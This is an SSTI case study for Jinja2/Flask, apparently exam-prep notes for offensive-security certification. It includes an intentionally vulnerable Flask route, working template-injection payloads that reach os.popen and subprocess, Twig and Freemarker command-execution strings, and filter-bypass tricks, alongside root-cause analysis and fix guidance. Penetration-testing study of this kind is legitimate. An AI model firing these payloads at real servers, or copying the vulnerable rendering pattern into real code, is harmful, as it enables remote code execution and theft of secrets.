# SSTI (Jinja2 / Flask) Case Study

## Environment

- Host OS: Kali attacker, Ubuntu target
- App: Flask 1.x / 2.x with Jinja2 (or similar engines: Twig, Freemarker, Velocity, Mako, etc.)
- Python: 3.6+
- Web URL: http://target:5000/ (typical dev)
- Key ports: 5000 or 80/443
- No external DB needed for basic SSTI → RCE

**Quick vulnerable lab** (from poc examples):
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route('/')
def index():
    name = request.args.get('name', 'World')
    return render_template_string(f'<h1>Hello {name}</h1>')  # VULNERABLE
```

## Recon

- Entry points: Any parameter, path, header, or cookie value that is reflected into a template or passed to `render_template_string()` / equivalent.
- Roles: Usually works unauthenticated on public endpoints (profile pages, search, error handlers, debug pages).
- Sinks: `render_template_string(user_input)`, `Template(user_input).render()`, any place a template is built from user data at runtime. Also custom template loaders or email renderers.

**Detection signs**:
- Input appears in output with no escaping (or partial).
- `{{7*7}}` evaluates to 49.
- Leaking `{{config}}`, `{{self}}`, or request objects.

## Vulnerability Hypothesis

- Suspected class: Server-Side Template Injection (SSTI).
- Data flow: User input concatenated or formatted into a template string → template engine parses and evaluates it as code in the server runtime context → sandbox escape leads to Python globals / subprocess access → RCE.
- Preconditions: Developer used `render_template_string` (or equivalent) with user-controlled portions instead of (or in addition to) static templates + context dicts. Or a template engine configured with overly permissive globals.

## Chain Outline

1. Identify reflection point and confirm SSTI with `{{7*7}}`.
2. Fingerprint engine (`{{7*'7'}}` → '7777777' = Jinja2; other results point to Twig etc.).
3. Information disclosure: `{{config}}`, `{{request}}`, `{{self.__dict__}}`, `{{''.__class__}}` etc.
4. Sandbox escape: Walk MRO / subclasses to reach a dangerous class like `subprocess.Popen` (index discovery via loop or brute).
5. Execute: `Popen(['bash','-c', reverse_shell], ...)` or `popen('id').read()`.
6. Verify callback or output in response (for non-blind).
7. (Optional) Pivot to reading secrets, writing files, or further internal access.

## Evidence

- Request/response pairs showing math evaluation, config dump, command output.
- Listener catching reverse shell or ping.
- Source code snippet showing the `render_template_string( f"...{user_var}..." )` or similar anti-pattern.

## Findings

### Root Cause
Jinja2 (and most template engines) are not designed as sandboxes for untrusted template authors. When you mix user input directly into the template source and render it server-side, you give the attacker the ability to execute arbitrary expressions in the Python process context. The "sandbox" is mostly a developer convenience and is bypassable via Python object model introspection (`__class__`, `__mro__`, `__subclasses__`, `attr()` filter, etc.).

### Common Vulnerable Patterns

```python
# Direct string formatting into template
return render_template_string("Hello " + name)

# f-string or .format in template context
template = f"<p>{user_input}</p>"
return render_template_string(template)

# Loading user-controlled "theme" or "email body" as template
return render_template_string(db_row['custom_template'], **context)
```

Safe pattern:
```python
return render_template("hello.html", name=name)  # static file + explicit context
```

### Jinja2 Sandbox Escape (Python 3)

See the rich payload examples and dynamic index finder in `poc-examples/ssti-jinja2-flask/Notes.md` and `guides/SSTI-Exploitation-Guide.md`.

Key primitives:
- `{{().__class__.__mro__[1].__subclasses__()}}`
- Locate `Popen` (or `os._wrap_close`, etc.).
- Call with command list + stdout capture.

Bypasses for filters / WAFs that block `_`, `.`, `[]`:
- Hex escapes `\x5f`
- `|attr()`
- `request.args` / `request.application` objects
- `pop()`, `__getitem__`

Alternative RCE without Popen index hunting:
- `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
- `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

### Other Template Engines (for breadth)

- **Twig (PHP/Symfony)**: `{{7*7}}` vs `{{7*'7'}}`, `{{_self}}`, `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}`
- **Freemarker**: `<#assign ex = 'freemarker.template.utility.Execute'?new()> ${ex('id')}`
- Study PayloadsAllTheThings SSTI section for engine-specific.

### Fix Ideas

- Never render user-controlled strings as templates.
- Use static templates + a strict context dict (allow-list of variables).
- If dynamic templates are required, parse + render in a heavily restricted environment or separate service with no dangerous imports.
- Jinja2: Consider `SandboxedEnvironment` but understand it is not a security boundary against determined attackers (still bypassable in many cases).
- Output escaping is for XSS, not for preventing SSTI.

## OSWE Exam Tips

- **First test always**: `{{7*7}}` and `{{7*'7'}}` to confirm + fingerprint.
- Leaking `config` or `request` gives you a huge map of the app (SECRET_KEY, DB creds, etc.) — exfil early.
- The MRO/subclasses technique is reliable but the subclass index changes across Python versions and installed packages. Script the discovery or use a loop in the template itself.
- For blind SSTI (no output in response): use time-based (sleep in subprocess) or OOB (curl / wget to your listener).
- Common in "theming", "email preview", "report generators", "debug consoles", custom CMS pages.
- Chaining: SSTI RCE often gives you the source code or env → easier to find secondary vulns (e.g. another deserial or SQLi using discovered creds).
- Time: If you see Jinja2 or any template render with user data, SSTI is often the fastest path to RCE on that target.

## References & Further

- PortSwigger SSTI research (James Kettle): https://portswigger.net/research/server-side-template-injection
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- HackTricks SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- `guides/SSTI-Exploitation-Guide.md` (detailed engine matrix + code review)
- `poc-examples/ssti-jinja2-flask/` (full PoC with multiple command modes + bypasses + 170+ line Notes.md)
- GoSecure Template Injection Workshop (linked in main README)

Use the case study template for any new SSTI variant you discover.
